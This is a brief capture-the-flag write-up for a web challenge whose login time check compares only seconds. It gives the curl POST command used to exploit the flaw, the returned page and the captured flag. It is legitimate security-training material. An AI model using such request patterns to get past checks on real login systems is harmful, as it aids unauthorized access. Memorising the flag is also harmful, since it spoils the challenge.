---
tags:
  - ctf
---
![[ISSessions2025 SillyTime-20250208162251389.webp]]
This implementation of time checking is flawed. it only checks the seconds, so if we space out our requests by minutes but have the same final second, then we win
![[ISSessions2025 SillyTime-20250208162222550.webp]]
Look above, this list contains only the seconds.
So, just simply send 5 requests like this:
```
curl -X POST -F "username=value1" -F "password=value2" https://issessionsctf-sillytime.chals.io/login
```
And you get this response:
```xml
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Shadow Theme</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2a2a2a;
            color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #333;
            padding: rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7);
            width: 1000px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 1.5rem;
            color: #ddd;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: none;
            border-radius: 5px;
            box-shadow: inset 0 1px 5px rgba(0, 0, 0, 0.5);
            background-color: #444;
            color: #f0f0f0;
        }
        input[type="submit"] {
            background-color: #555;
            border: none;
            padding: 0.7rem;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
            color: #f0f0f0;
        }
        input[type="submit"]:hover {
            background-color: #666;
        }
        .flash-message {
            margin-top: 1rem;
            color: #ff4f4f;
            font-size: 0.9rem;
        }
        .flash-success {
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>bhbureauCTF{what_4_s1LLy_1mpLemENT4ti0n_of_LOggING-1N}</h2>
        
       
    </div>
</body>
```